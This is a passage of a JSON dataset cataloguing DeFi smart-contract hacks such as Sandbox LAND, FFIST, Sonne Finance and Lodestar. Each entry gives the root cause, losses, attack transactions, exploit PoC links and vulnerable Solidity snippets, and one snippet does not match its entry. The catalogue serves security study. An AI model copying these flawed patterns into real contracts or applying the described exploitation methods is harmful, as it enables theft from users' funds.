        "vulnerable_code_snippet":"function zapToBMI(\n        address _from,\n        uint256 _amount,\n        address _fromUnderlying,\n        uint256 _fromUnderlyingAmount,\n        uint256 _minBMIRecv,\n        address[] memory _bmiConstituents,\n        uint256[] memory _bmiConstituentsWeightings,\n        address _aggregator,\n        bytes memory _aggregatorData,\n        bool refundDust\n    ) public returns (uint256) {\n        uint256 sum = 0;\n        for (uint256 i = 0; i < _bmiConstituentsWeightings.length; i++) {\n            sum = sum.add(_bmiConstituentsWeightings[i]);\n        }\n\n        // Sum should be between 0.999 and 1.000\n        assert(sum <= 1e18);\n        assert(sum >= 999e15);\n\n        // Transfer to contract\n        IERC20(_from).safeTransferFrom(msg.sender, address(this), _amount);\n\n        // Primitive\n        if (_isBare(_from)) {\n            _primitiveToBMI(_from, _amount, _bmiConstituents, _bmiConstituentsWeightings, _aggregator, _aggregatorData);\n        }\n        // Yearn (primitive)\n        else if (_isYearn(_from)) {\n            IYearn(_from).withdraw();\n            _primitiveToBMI(\n                _fromUnderlying,\n                _fromUnderlyingAmount,\n                _bmiConstituents,\n                _bmiConstituentsWeightings,\n                _aggregator,\n                _aggregatorData\n            );\n        }\n        // Yearn (primitive)\n        else if (_isYearnCRV(_from)) {\n            IYearn(_from).withdraw();\n            address crvToken = IYearn(_from).token();\n            _crvToPrimitive(crvToken, IERC20(crvToken).balanceOf(address(this)));\n            _primitiveToBMI(\n                USDC,\n                IERC20(USDC).balanceOf(address(this)),\n                _bmiConstituents,\n                _bmiConstituentsWeightings,\n                address(0),\n                \"\"\n            );\n        }\n        // Compound\n        else if (_isCompound(_from)) {\n            require(ICToken(_from).redeem(_amount) == 0, \"!ctoken-redeem\");\n            _primitiveToBMI(\n                _fromUnderlying,\n                _fromUnderlyingAmount,\n                _bmiConstituents,\n                _bmiConstituentsWeightings,\n                _aggregator,\n                _aggregatorData\n            );\n        }\n        // Aave\n        else if (_isAave(_from)) {\n            IERC20(_from).safeApprove(AAVE_LENDING_POOL_V2, 0);\n            IERC20(_from).safeApprove(AAVE_LENDING_POOL_V2, _amount);\n            ILendingPoolV2(AAVE_LENDING_POOL_V2).withdraw(_fromUnderlying, type(uint256).max, address(this));\n\n            _primitiveToBMI(\n                _fromUnderlying,\n                _fromUnderlyingAmount,\n                _bmiConstituents,\n                _bmiConstituentsWeightings,\n                _aggregator,\n                _aggregatorData\n            );\n        }\n        // Curve\n        else {\n            _crvToPrimitive(_from, _amount);\n            _primitiveToBMI(\n                USDC,\n                IERC20(USDC).balanceOf(address(this)),\n                _bmiConstituents,\n                _bmiConstituentsWeightings,\n                address(0),\n                \"\"\n            );\n        }\n\n        // Checks\n        uint256 _bmiBal = IERC20(BMI).balanceOf(address(this));\n        require(_bmiBal >= _minBMIRecv, \"!min-mint\");\n        IERC20(BMI).safeTransfer(msg.sender, _bmiBal);\n\n        // Convert back dust to USDC and refund remaining USDC to usd\n        if (refundDust) {\n            for (uint256 i = 0; i < _bmiConstituents.length; i++) {\n                _fromBMIConstituentToUSDC(_bmiConstituents[i], IERC20(_bmiConstituents[i]).balanceOf(address(this)));\n            }\n            IERC20(USDC).safeTransfer(msg.sender, IERC20(USDC).balanceOf(address(this)));\n        }\n\n        return _bmiBal;\n    }"
    },
    {
        "type": "Access Control",
        "date": "20220208",
        "title": "Sandbox LAND",
        "root_cause": "incorrect access control.",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220208-sandbox-land---access-control",
        "analysis": "In the past, the _burn function that was set to be called was set in a public state. Even though there is a require(from == owner, “not owner”); in the function, the from in the function can still be constructed by any caller. This could results in anyone burning other players NFTs at will.",
        "metaverse": true,
        "vulnerable_code_snippet" : "function _burn(address from, address owner, uint256 id) public {\n        require(from == owner, \"not owner\");\n        _owners[id] = 2**160; // cannot mint it again\n        _numNFTPerAddress[from]--;\n        emit Transfer(from, address(0), id);\n    }"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20240529",
        "title": "MetaDragon",
        "root_cause": "Incorrect logic check. if (to == address(this) || to == erc721) {transform(value);} allows for unrestricted minting",
        "attack_tx": "https://app.blocksec.com/explorer/tx/bsc/0x3ad998a01ad1f1bbe6dba6a08e658c1749dabfa4a07da20ded3c73bcd6970d20",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/MetaDragon_exp.sol",
        "analysis": "if (to == address(this) || to == erc721) {transform(value);} allows for unrestricted minting",
        "vulnerable_code_snippet": "function _update(address from, address to, uint256 value) internal override { ... if (to == address(this) || to == erc721) { transform(value); } ... }",
        "lost": "$180k"
    },
    {
        "type": "Bad randomness",
        "date": "20230720",
        "title": "FFIST",
        "root_cause": "The root cause is in `_airdrop()` function, the airdrop address can be calculated and it could overwrite any balance of an address to a specific number. Attacker can overwrote the balance of the swap, causing the K change thus a big gain on the swap. The random seed is not randomized which is  easy to construct 'to' and 'tAmount' here to get an arbitrary airdropAddress address and that address will be used for balance overwritten.",
        "attack_tx": "https://app.blocksec.com/explorer/tx/bsc/0x199c4b88cab6b4b495b9d91af98e746811dd8f82f43117c48205e6332db9f0e0?line=45&debugLine=45",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/FFIST_exp.sol",
        "analysis": "https://x.com/Phalcon_xyz/status/1681869807698984961",
        "lost": "$110k",
        "vulnerable_code_snippet":"function _airdrop(address from, address to, uint256 tAmount) private {\n        uint256 num = 4;\n        uint256 seed = (uint160(lastAirdropAddress) | block.number) ^ (uint160(from) ^ uint160(to));\n        uint256 airdropAmount = 1;\n        address airdropAddress;\n        for (uint256 i; i < num;) {\n            airdropAddress = address(uint160(seed | tAmount));\n            _balances[airdropAddress] = airdropAmount;\n            emit Transfer(airdropAddress, airdropAddress, airdropAmount);\n        unchecked{\n            ++i;\n            seed = seed >> 1;\n        }\n        }\n        lastAirdropAddress = airdropAddress;\n    }"
    },
    {
        "type": "ERC20, Flashloans, Reward",
        "date": "20220909",
        "lost": "$742,286",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220909-YYDS---pair-manipulate",
        "title": "YYDS",
        "root_cause": "Calculation of reward being too simple and only depends on the pool reserve by balanceOf.",
        "vulnerable_contract": "0xe70cdd37667cddf52cabf3edabe377c58fae99e9"
    },
    {
        "type": "Access Control",
        "date": "20230708",
        "title": "Civfund",
        "root_cause": "The root cause is that `uniswapV3MintCallback`  lack of access control so the attacker can call `uniswapV3MintCallback` to transfer the funds approved by other users.",
        "attack_tx": "https://etherscan.io/tx/0xc42fc0e22a0f60cc299be80eb0c0ddce83c21c14a3dddd8430628011c3e20d6b",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Civfund_exp.sol",
        "analysis": [
            "https://twitter.com/HypernativeLabs/status/1677529544062803969",
            "https://twitter.com/BeosinAlert/status/1677548773269213184"
        ],
        "Lost": "$165k",
        "vulnerable_code_snippet": "function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) override external {\n        // Unpack parameters sent from the `liquidate` function\n        // NOTE: these are being passed in from some other contract, and cannot necessarily be trusted\n        (address borrower, address repayAToken, address seizeAToken) = abi.decode(data, (address, address, address));\n\n        address token0 = IPancakePair(msg.sender).token0();\n        address token1 = IPancakePair(msg.sender).token1();\n        require(msg.sender == IPancakeFactory(FACTORY).getPair(token0, token1));\n\n        if (repayAToken == seizeAToken) {\n            uint amount = amount0 != 0 ? amount0 : amount1; \n            address estuary = amount0 != 0 ? token0 : token1; //@note -> BNB\n\n            // Perform the liquidation\n            IERC20(estuary).safeApprove(repayAToken, amount);\n            ABep20(repayAToken).liquidateBorrow(borrower, amount, seizeAToken);\n\n            // Redeem aTokens for underlying ERC20\n            ABep20(seizeAToken).redeem(IERC20(seizeAToken).balanceOf(address(this)));\n\n            // Compute debt and pay back pair\n            IERC20(estuary).transfer(msg.sender, (amount * 1000 / 997) + 1);\n            return;\n        }\n\n        if (repayAToken == ABNB) {\n            uint amount = amount0 != 0 ? amount0 : amount1;\n            address estuary = amount0 != 0 ? token1 : token0;\n\n            // Convert WBNB to BNB\n            IWBNB(WBNB).withdraw(amount);\n\n            // Perform the liquidation\n            ABnb(repayAToken).liquidateBorrow{value: amount}(borrower, seizeAToken);\n\n            // Redeem aTokens for underlying ERC20\n            ABep20(seizeAToken).redeem(IERC20(seizeAToken).balanceOf(address(this)));\n\n            // Compute debt and pay back pair\n            (uint reserveOut, uint reserveIn) = PancakeLibrary.getReserves(FACTORY, WBNB, estuary);\n            IERC20(estuary).transfer(msg.sender, PancakeLibrary.getAmountIn(amount, reserveIn, reserveOut));\n            return;\n        }\n\n        if (seizeAToken == ABNB) {\n            uint amount = amount0 != 0 ? amount0 : amount1;\n            address source = amount0 != 0 ? token0 : token1;\n\n            // Perform the liquidation\n            IERC20(source).safeApprove(repayAToken, amount);\n            ABep20(repayAToken).liquidateBorrow(borrower, amount, seizeAToken);\n\n            // Redeem aTokens for underlying ERC20 or BNB\n            ABep20(seizeAToken).redeem(IERC20(seizeAToken).balanceOf(address(this)));\n\n            // Convert BNB to WBNB\n            IWBNB(WBNB).deposit{value: address(this).balance}();\n\n            // Compute debt and pay back pair\n            (uint reserveOut, uint reserveIn) = PancakeLibrary.getReserves(FACTORY, source, WBNB);\n            uint debt = PancakeLibrary.getAmountIn(amount, reserveIn, reserveOut);\n\n            IERC20(WBNB).transfer(msg.sender, debt);\n            return;\n        }\n\n        uint amount;\n        address source;\n        address estuary;\n        if (amount0 != 0) {\n            amount = amount0;\n            source = token0;\n            estuary = token1;\n        } else {\n            amount = amount1;\n            source = token1;\n            estuary = token0;\n        }\n\n        // Perform the liquidation\n        IERC20(source).safeApprove(repayAToken, amount);\n        ABep20(repayAToken).liquidateBorrow(borrower, amount, seizeAToken);\n\n        // Redeem aTokens for underlying ERC20 or BNB\n        uint seized_uUnits = ABep20(seizeAToken).balanceOfUnderlying(address(this));\n        ABep20(seizeAToken).redeem(IERC20(seizeAToken).balanceOf(address(this)));\n        address seizeUToken = ABep20Storage(seizeAToken).underlying();\n\n        // Compute debt\n        (uint reserveOut, uint reserveIn) = PancakeLibrary.getReserves(FACTORY, source, estuary);\n        uint debt = PancakeLibrary.getAmountIn(amount, reserveIn, reserveOut);\n\n        if (seizeUToken == estuary) {\n            // Pay back pair\n            IERC20(estuary).transfer(msg.sender, debt);\n            return;\n        }\n\n        IERC20(seizeUToken).safeApprove(ROUTER, seized_uUnits);\n\n        // Define swapping path\n        address;\n        path[0] = seizeUToken;\n        path[1] = estuary;\n\n        uint256 minReceiveDebt = debt * 95 / 100;\n        //                                                  sent, min desired, ,   path, recipient,     deadline\n        IPancakeRouter(ROUTER).swapExactTokensForTokens(seized_uUnits, minReceiveDebt, path, address(this), now + 1 minutes);\n\n        IERC20(seizeUToken).safeApprove(ROUTER, 0);\n\n        // Pay back pair\n        IERC20(estuary).transfer(msg.sender, debt);\n    }"
    },
    {
        "type": "ERC721, Flashloans, Reentrancy",
        "date": "20220710",
        "lost": "$1.4M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220710-omni-nft---reentrancy",
        "title": "Omni NFT",
        "root_cause": "safeTransferFrom in burn function. project without nonReentrant protection.",
        "vulnerable_code_snippet": "function executeWithdrawERC721(\n        mapping(address => DataTypes.ReserveData) storage reservesData,\n        mapping(uint256 => address) storage reservesList,\n        DataTypes.UserConfigurationMap storage userConfig,\n        DataTypes.ExecuteWithdrawERC721Params memory params\n    ) external returns (uint256) {\n        DataTypes.ReserveData storage reserve = reservesData[params.asset];\n        DataTypes.ReserveCache memory reserveCache = reserve.cache();\n\n        reserve.updateState(reserveCache);\n        uint256 amountToWithdraw = params.tokenIds.length;\n\n        bool withdrwingAllCollateral = INToken(reserveCache.xTokenAddress).burn(\n            msg.sender,\n            params.to,\n            params.tokenIds,\n            reserveCache.nextLiquidityIndex\n        ); /// @inheritdoc INToken\n    function burn(\n        address from,\n        address receiverOfUnderlying,\n        uint256[] calldata tokenIds,\n        uint256 index\n    ) external virtual override onlyPool returns (bool) {\n        bool withdrawingAllTokens = _burnMultiple(from, tokenIds);\n\n        if (receiverOfUnderlying != address(this)) {\n            for (uint256 index = 0; index < tokenIds.length; index++) {\n                IERC721(_underlyingAsset).safeTransferFrom( //vulnerable point\n                    address(this),\n                    receiverOfUnderlying,\n                    tokenIds[index]\n                );\n            }\n        }"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20240616",
        "title": "WIFCOIN_ETH",
        "root_cause": "Double claimEarned, Each time the `claimEarned` function is called, the code iterates through all the stakes and accumulates the calculated `_earned` amount. However, after calculating the rewards, the already calculated rewards are not marked as claimed. As a result, the next time `claimEarned` is called, it will recalculate those already claimed rewards, allowing users to claim rewards multiple times.",
        "attack_tx": "https://etherscan.io/tx/0x58424115c6576b19cfb78b0b7ff00e0c13daa06d259f2a67210c112731519e09",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/WIFCOIN_ETH_exp.sol",
        "analysis": "https://x.com/ChainAegis/status/1802550962977964139",
        "vulnerable_code_snippet" : "function claimEarned(uint256 _stakingId, uint256 _burnRate) public override {\n        require(_burnRate == 10 || _burnRate == 25 || _burnRate == 40, \"Invalid burn rate\");\n\n        uint256 _earned = 0;\n        Plan storage plan = plans[_stakingId];\n\n        require(stakes[_stakingId][msg.sender].length > 0, \"No stakes found\");\n\n        for (uint256 i = 0; i < stakes[_stakingId][msg.sender].length; i++) {\n            Staking storage _staking = stakes[_stakingId][msg.sender][i];\n            _earned = _earned.add(\n                _staking\n                    .amount\n                    .mul(plan.apr)\n                    .div(10000)\n            );\n\n            totalRewards = totalRewards.add(_earned);\n            totalRewardsPerPlan[_stakingId] = totalRewardsPerPlan[_stakingId].add(_earned);\n\n            totalRewardsPerWalletPerPlan[_stakingId][msg.sender] = totalRewardsPerWalletPerPlan[_stakingId][msg.sender].add(_earned);\n\n            totalEarnedRewardsPerWallet[msg.sender] += _earned;\n        \n            _staking.stakeAt = block.timestamp;\n        }\n\n        require(_earned > 0, \"There is no amount to claim\");\n\n        uint256 burnAmount = _earned.mul(_burnRate).div(100);\n        IERC20(stakingToken).transfer(BURN_ADDRESS, burnAmount);\n        IERC20(stakingToken).transfer(msg.sender, _earned.sub(burnAmount));\n    }"
    },
    {
        "type": "Insufficient validation",
        "date": "20221109",
        "title": "BrahTOPG",
        "root_cause": "The contract zapper does not maintain enough validations, which allows attackers to manipulate the victims' pre-approved funds with fake tokens.",
        "attack_tx": "https://etherscan.io/tx/0xeaef2831d4d6bca04e4e9035613be637ae3b0034977673c1c2f10903926f29c0",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/BrahTOPG_exp.sol",
        "analysis": [
            "1. The attacker queried the USDC balance of one of the users",
            "2. Invoke `zapIn` with an attacker-controlled token.",
            "3. The `zapIn` invocation will trigger the `zap` function, transferring the pre-approved USDC tokens from the victim."
        ],
        "vulnerable_code": "https://vscode.blockscan.com/ethereum/0xd248b30a3207a766d318c7a87f5cf334a439446d",
        "Lost": "$89k",
        "vulnerable_code_snippet":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Contract module that helps prevent reentrant calls to a function.\n *\n * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier\n * available, which can be applied to functions to make sure there are no nested\n * (reentrant) calls to them.\n *\n * Note that because there is a single `nonReentrant` guard, functions marked as\n * `nonReentrant` may not call one another. This can be worked around by making\n * those functions `private`, and then adding `external` `nonReentrant` entry\n * points to them.\n *\n * TIP: If you would like to learn more about reentrancy and alternative ways\n * to protect against it, check out our blog post\n * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].\n */\nabstract contract ReentrancyGuard {\n    uint256 private constant _NOT_ENTERED = 1;\n    uint256 private constant _ENTERED = 2;\n\n    uint256 private _status;\n\n    constructor() {\n        _status = _NOT_ENTERED;\n    }\n\n    /**\n     * @dev Prevents a contract from calling itself, directly or indirectly.\n     * Calling a `nonReentrant` function from another `nonReentrant`\n     * function is not supported. It is possible to prevent this from happening\n     * by making the `nonReentrant` function external, and making it call a\n     * `private` function that does the actual work.\n     */\n    modifier nonReentrant() {\n        _nonReentrantBefore();\n        _;\n        _nonReentrantAfter();\n    }\n\n    function _nonReentrantBefore() private {\n        require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\");\n        _status = _ENTERED;\n    }\n\n    function _nonReentrantAfter() private {\n        _status = _NOT_ENTERED;\n    }\n}"
    },
    {
        "type": "Precision",
        "date": "20240514",
        "title": "Sonne Finance",
        "root_cause": "Compound v2 forks bug. first deposit",
        "attack_tx": [
            "https://optimistic.etherscan.io/tx/0x45c0ccfd3ca1b4a937feebcb0f5a166c409c9e403070808835d41da40732db96",
            "https://optimistic.etherscan.io/tx/0x9312ae377d7ebdf3c7c3a86f80514878deb5df51aad38b6191d55db53e42b7f0"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/Sonne_exp.sol",
        "analysis": [
            "https://www.quillaudits.com/blog/hack-analysis/sonne-finance-hack",
            "https://www.quillaudits.com/blog/hack-analysis/sonne-finance-hack"
        ],
        "lost": "$20M",
        "vulnerable_code_snippet":"function exchangeRateStoredInternal()\n        internal\n        view\n        virtual\n        returns (uint256)\n    {\n        uint256 _totalSupply = totalSupply;\n        if (_totalSupply == 0) {\n            /*\n             * If there are no tokens minted:\n             *  exchangeRate = initialExchangeRate\n             */\n            return initialExchangeRateMantissa;\n        } else {\n            /*\n             * Otherwise:\n             *  exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply\n             */\n            uint256 totalCash = getCashPrior();\n            uint256 cashPlusBorrowsMinusReserves = totalCash +\n                totalBorrows -\n                totalReserves;\n            uint256 exchangeRate = (cashPlusBorrowsMinusReserves * expScale) /\n                _totalSupply; // <-- vulnerable point\n\n            return exchangeRate;\n        }\n    }"
    },
    {
        "type": "Flashloans, Reward",
        "date": "20231114",
        "title": "OKC Project",
        "root_cause": "The victim contract `MinerPool` requires `extcodesize!=0`(EOA check) before adding an address to `lpRewardProcessor` array to be eligible for rewards. The victim contract `MinerPool` will distribute the rewards regardless of the LP holding time. The attacker leveraged substantial flash loans to borrow a significant amount of USDT and exchanged it for a large quantity of OKC tokens to add liquidity. Additionally, due to the absence of lock-up requirements for LP reward distribution in the OKC project, the hacker promptly withdrew liquidity after receiving rewards, thereby claiming the incentives intended for liquidity providers from the project.",
        "attack_tx": "https://bscscan.com/tx/0xd85c603f71bb84437bc69b21d785f982f7630355573566fa365dbee4cd236f08",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/OKC_exp.sol",
        "analysis": "https://lunaray.medium.com/okc-project-hack-analysis-0907312f519b",
        "lost": "$6268",
        "vulnerable_code_snippet": "function addHolder(address adr) external onlyAdmin {\n    uint256 size;\n    assembly { size := extcodesize(adr) }\n    if (size > 0) {\n        return;\n    }\n    if (0 == holderIndex[adr]) {\n        if (0 == holders.length || holders[0] != adr) {\n            holderIndex[adr] = holders.length;\n            holders.push(adr);\n        }\n    }\n}\n\n\nfunction processLPReward() public {\nif(lastProcessTimestamp + 24 hours > block.timestamp) return;\n\nuint256 lpHolderCount = lpRewardProcessor.getLength();\n\naddress pair = lpRewardProcessor.getPair();\n\nuint256 pairTotalSupply = ISwapPair(pair).totalSupply();\n\nuint256 pairTokenBalance = IERC20(ISwapPair(pair).token1()).balanceOf(address(this));\nif(lpHolderCount == 0) return;\nif(token.balanceOf(address(this)) == 0) return;\n\nfor (uint256 i = 0; i < lpHolderCount; i++) {\naddress _addr = lpRewardProcessor.holders(i);\nuint256 _lpBal = IERC20(pair).balanceOf(_addr);\n\nuint256 amount = pairTokenBalance * _lpBal / pairTotalSupply;\n\ntoken.transfer(_addr, amount * 1 / 100);\n}\n\nlastProcessTimestamp = block.timestamp;"
    },
    {
        "type": "ERC20, Flashloans, Reward",
        "date": "20231102",
        "title": "3913Token",
        "root_cause": "The token uses `pair.reserves()` and `token.balanceOf(pair)` to determine if the current transaction is purchase or sell. However, this could be **manipulated** via sending tokens to the `pair` address and call `skim'. The token will distribute `inviteBonus`  to the `to` address without setting a upper limit for the reward.",
        "attack_tx": "https://bscscan.com/tx/0x8163738d6610ca32f048ee9d30f4aa1ffdb3ca1eddf95c0eba086c3e936199ed",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/3913_exp.sol",
        "analysis": [
            "https://defimon.xyz/attack/bsc/0x8163738d6610ca32f048ee9d30f4aa1ffdb3ca1eddf95c0eba086c3e936199ed",
            "https://www.immunebytes.com/blog/list-of-crypto-hacks-in-the-month-of-november/#Nov_"
        ],
        "lost": "$31354 USD$",
        "vulnerable_code_snippet":"function _transfer(\n    address from,\n    address to,\n    uint256 amount\n) internal returns (bool) {\n    require(!_robots[from], \"is robot\");\n    require(from != address(0), \"BEP20: transfer from the zero address\");\n    require(to != address(0), \"BEP20: transfer to the zero address\");\n    require(amount > 0, \"BEP20: transfer amount must be greater than zero\");\n\n    (bool isAdd, bool isDel) = _isLiquidity(from, to);\n    updateTime();\n    _burnToken(from);\n    _burnToken(to);\n    if (_v2Pairs[to] && !isAdd && from != address(this)) {\n        burnPairs();\n    }\n\n    if (_v2Pairs[from] && !isDel) {\n        _inviteBonus(to, amount);\n    }\n    ...\n}\n\nfunction _inviteBonus(address to, uint256 amount) private {\n    if (_users[to].pid != address(0)) {\n        uint256 balance_t = _balances[address(_smartVault_invite)];\n        if (balance_t == 0) return;\n\n        uint256 bunusAmount = amount.mul(_inviteRate).div(RBASE);\n        bunusAmount = bunusAmount > balance_t ? balance_t : bunusAmount;\n\n        _smartVault_invite.transfer(address(this), _users[to].pid, bunusAmount);\n    }\n}"
    },
    {
        "type": "ERC20, Flashloans, Insufficient validation",
        "date": "20220725",
        "title": "LPC",
        "fixed": "unfixed",
        "root_cause": "Incorrect recipient balance check, did not check sender!=recipient in transfer. Increase directly on the recipientAmount to recipient, deduct sender balance incorrectly.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220725-lpc---business-logic-flaw--incorrect-recipient-balance-check-did-not-check-senderrecipient-in-transfer",
        "vulnerable_code": "https://bscscan.com/address/0x1e813fa05739bf145c1f182cb950da7af046778d#code#L1240",
        "fixed_code": "https://etherscan.io/address/0x1c91aF03A390b4c619B444425b3119e553B5B44b#code#L414",
        "lost": "$45K",
        "analysis": "Increase directly on the recipientAmount to recipient, deduct sender balance incorrectly.",
        "vulnerable_code_snippet": "function _transfer(\n    // ... other parameters\n) internal {\n    totalHolders = totalHolders_;\n\n    _balances[sender] = senderBalance.sub(amount);\n    _balances[recipient] = recipientBalance.add(recipientAmount);\n    emit Transfer(sender, recipient, recipientAmount);\n\n    _afterTokenTransfer(sender, recipient, amount);\n}"
    },
    {
        "type": "Flashloans, Incorrect logic, Price Manipulation",
        "date": "20221211",
        "lost": "$4M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Lodestar_exp.sol",
        "title": "Lodestar",
        "root_cause": "FlashLoan price manipulation - Incorrect logic in GLPOracle.\nThe root cause is attributed to the construction of the Lodestar GLPOracle and how it obtained the price of plvGLP tokens. The GLPOracle failed to consider the impact of a user calling the donate() function on the GlpDepositor contract. This action inflated the assets of the GlpDepositor contract, consequently affecting the oracle-delivered price of the plvGLP token. As a result, the price reported by the GLPOracle became inaccurate due to the improper handling of the donation mechanism, leading to the vulnerability exploited by malicious users.",
        "vulnerable_code_snippet": "function getPlvGLPPrice() public view returns (uint256) {\n        uint256 exchangeRate = getPlutusExchangeRate();\n\n        uint256 glpPrice = getGLPPrice();\n\n        uint256 price = (exchangeRate * glpPrice) / BASE;\n\n        return price;\n    }\nfunction getPlutusExchangeRate() public view returns (uint256) {\n        //retrieve total assets from plvGLP contract\n        uint256 totalAssets = plvGLPInterface(plvGLP).totalAssets();\n\n        //retrieve total supply from plvGLP contract\n        uint256 totalSupply = EIP20Interface(plvGLP).totalSupply();\n\n        //plvGLP/GLP Exchange Rate = Total Assets / Total Supply\n        uint256 exchangeRate = (totalAssets * BASE) / totalSupply;\n\n        return exchangeRate;\n    }\n \nfunction donate(uint256 _assets) external {\nsGLP.safeTransferFrom(msg.sender, staker, _assets);\nITokenMinter(minter).mint(vault, _assets);\n  }\n",
        "attack_tx": "https://explorer.phalcon.xyz/tx/arbitrum/0xc523c6307b025ebd9aef155ba792d1ba18d5d83f97c7a846f267d3d9a3004e8c",
        "analysis": [
            "https://twitter.com/SolidityFinance/status/1601684150456438784",
            "https://blog.lodestarfinance.io/post-mortem-summary-13f5fe0bb336"
        ]
    },
    {
        "type": "Access Control",
        "date": "20231107",
        "title": "MEVbot",
        "root_cause": [
            "The function `0xf6ebebbb` has no access control, and it could be called by anyone to perform swap in `Curve` pool.",
            "The attacker could use the funds in the MEV to pump the price of tokens like `WBTC`  to gain profits for his own token."
        ],
        "attack_tx": "https://explorer.phalcon.xyz/tx/eth/0xbc08860cd0a08289c41033bdc84b2bb2b0c54a51ceae59620ed9904384287a38",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/bot_exp.sol",
        "analysis": "https://twitter.com/BlockSecTeam/status/1722101942061601052"
    },
    {
        "type": "DAO, Flashloans, skim",
        "date": "20220524",
        "title": "HackDao",
        "root_cause": "Incorrect logic in _transfer  function of token contract.Cause Uniswap pair can be reduced without any swap, so attacker can do price manipulation. Once imbalance in the pair, attacker can call skim() to get profit.",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220524-hackdao---skim-token-balance",
        "analysis": "Cause Uniswap pair can be reduced without any swap, so attacker can do price manipulation. Once imbalance in the pair, attacker can call skim() to get profit.",
        "vulnerable_code": [
            "https://bscscan.com/address/0x94e06c77b02ade8341489ab9a23451f68c13ec1c#code#L475",
            "https://bscscan.com/address/0x94e06c77b02ade8341489ab9a23451f68c13ec1c#code#L494"
        ],
        "vulnerable_code_snippet":"function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal override virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        uint256 senderBalance = _balances[sender];\n\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[sender] = senderBalance - amount;\n        }\n        uint256 actualAmount = amount;\n\n        if(parentAddress[recipient] == address(0) && recipient != uniswapV2Pair){\n            if(sender == uniswapV2Pair){\n                parentAddress[recipient] = _defaultAddress;\n            }else{\n                parentAddress[recipient] = sender;\n            }\n        }\n\n        if(!isWhiteListed(sender) && !isWhiteListed(recipient)){\n            \n            uint256 fee = calculationFeeNum(amount,_feeRatio);\n            //sell\n            if(recipient == uniswapV2Pair){\n                require(senderBalance >= amount.add(fee), \"ERC20: There are not enough charges for the account balance\");\n                unchecked {\n                    _balances[sender] -= fee;\n                }\n            }else{\n                actualAmount = amount - fee;\n            }"
    },
    {
        "type": "ERC20, Flashloans, Insufficient validation, Reward",
        "date": "20220809",
        "title": "ANCH",
        "root_cause": "insufficient validation , get rewards over skim(). if it supports skim(), the token transfer does not check if recipient and sender are the same, any reward, factor and balance change in _transfer() function, then you are vulnerable for the attack.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220809-anch---skim-token-balance",
        "vulnerable_code": "https://www.bscscan.com/address/0xa4f5d4afd6b9226b3004dd276a9f778eb75f2e9e#code#L764",
        "analysis": "if it supports skim(), the token transfer does not check if recipient and sender are the same, any reward, factor and balance change in _transfer() function, then you are vulnerable for the attack.\n\nThe wild attack is on fire.\n\n[$UPS](https://twitter.com/search?q=%24UPS&src=cashtag_click)\n[$ANCH](https://twitter.com/search?q=%24ANCH&src=cashtag_click)\n[$XST](https://twitter.com/search?q=%24XST&src=cashtag_click)",
        "vulnerable_code_snippet":"//this method is responsible for taking all fee, if takeFee is true\n    function _transfer( //vulnerable point - recipient and sender can the same\n        address sender,\n        address recipient,\n        uint256 tAmount\n    ) private {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        require(tAmount > 0, \"Transfer amount must be greater than zero\");\n        // Insufficient validation. sender and recipient can be same.\n        \n\tif(sender == uniswapV2Pair) {\n            _tokenBuyTransferReward(sender, recipient, tAmount);\n        } else if(recipient == uniswapV2Pair) {\n            _tokenSellTransferReward(sender, recipient, tAmount);\n        } else{\n\n            uint256 currentRate = _getRate();\n            uint256 rAmount = tAmount.mul(currentRate);\n            _rOwned[sender] = _rOwned[sender].sub(rAmount);\n            _rOwned[recipient] = _rOwned[recipient].add(rAmount);\n            \n            emit Transfer(sender, recipient, tAmount);\n        }"
    },
    {
        "type": "Flashloans, Price Manipulation",
        "date": "20230607",
        "lost": "$27,174",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/CompounderFinance_exp.sol",
        "title": "CompounderFinance",
        "root_cause": "Fluctuations in the amount of funds available for exchange due to changes in the proportions of the liquidity pool.",
        "attack_tx": "https://etherscan.io/tx/0xcff84cc137c92e427f720ca1f2b36fbad793f34ec5117eed127060686e6797b1",
        "analysis": "https://twitter.com/numencyber/status/1666346419702362112",
